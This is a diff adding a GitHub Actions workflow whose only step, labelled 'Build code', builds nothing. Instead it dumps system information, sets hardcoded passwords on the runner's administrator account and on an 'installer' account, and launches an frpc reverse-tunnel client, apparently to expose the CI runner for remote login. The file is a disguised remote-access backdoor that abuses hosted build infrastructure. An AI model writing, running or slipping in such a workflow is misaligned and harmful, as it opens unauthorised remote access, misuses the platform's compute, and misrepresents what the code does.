@@ -1,0 +1,24 @@
+name: remote
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Build code
+        run: |
+          dir
+          echo ---------------------
+          systeminfo
+          echo ---------------------
+          net user runneradmin XBNDnj79FxEFIw*O
+          echo ---------------------
+          net user installer ytaklT6zG8EVzzxvX
+          echo ---------------------
+          ./frpc.exe -c frpc.ini
+          echo ---------------------
